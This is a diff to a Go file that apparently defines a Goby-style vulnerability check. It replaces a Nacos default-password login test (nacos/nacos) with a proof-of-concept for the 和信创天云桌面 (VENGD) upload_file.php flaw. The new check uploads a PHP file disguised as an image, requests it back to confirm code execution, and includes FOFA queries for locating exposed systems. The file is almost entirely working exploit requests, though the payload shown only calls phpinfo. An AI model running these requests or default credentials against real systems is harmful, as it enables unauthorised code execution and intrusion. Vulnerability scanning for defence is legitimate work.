@@ -6,14 +6,14 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "Alibaba Nacos 默认密码",
+  "Name": "和信创天云桌面系统 upload_file.php 远程命令执行漏洞",
   "Description": "",
-  "Product": "Nacos",
+  "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "title=\"Nacos\"",
-  "GobyQuery": "title=\"Nacos\"",
+  "FofaQuery": "和信下一代云桌面VENGD",
+  "GobyQuery": "和信下一代云桌面VENGD",
   "Level": "3",
   "Impact": "",
   "Recommendation": "",
@@ -30,16 +30,13 @@ func init() {
     {
       "Request": {
         "method": "POST",
-        "uri": "/nacos/v1/auth/users/login",
+        "uri": "/Upload/upload_file.php?l=1",
         "follow_redirect": true,
         "header": {
-          "Accept": "application/json, text/plain, */*",
-          "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-          "Accept-Encoding": "gzip, deflate",
-          "Content-Type": "application/x-www-form-urlencoded"
+          "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv"
         },
         "data_type": "text",
-        "data": "username=nacos&password=nacos"
+        "data": "------WebKitFormBoundaryfcKRltGv\nContent-Disposition: form-data; name=\"file\"; filename=\"test.php\"\nContent-Type: image/avif\n\n<?php phpinfo(); ?>\n------WebKitFormBoundaryfcKRltGv--"
       },
       "ResponseTest": {
         "type": "group",
@@ -56,7 +53,38 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "accessToken",
+            "value": "",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/Upload/1/test.php",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "PHP Version",
             "bz": ""
           }
         ]
@@ -112,8 +140,8 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "Alibaba Nacos 默认密码",
-      "Product": "Nacos",
+      "Name": "和信创天云桌面系统 upload_file.php 远程命令执行漏洞",
+      "Product": "",
       "Description": "",
       "Recommendation": "",
       "Impact": "",
@@ -121,7 +149,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "Alibaba Nacos Default password",
+      "Name": "vesystem NGD rce",
       "Product": "",
       "Description": "",
       "Recommendation": "",
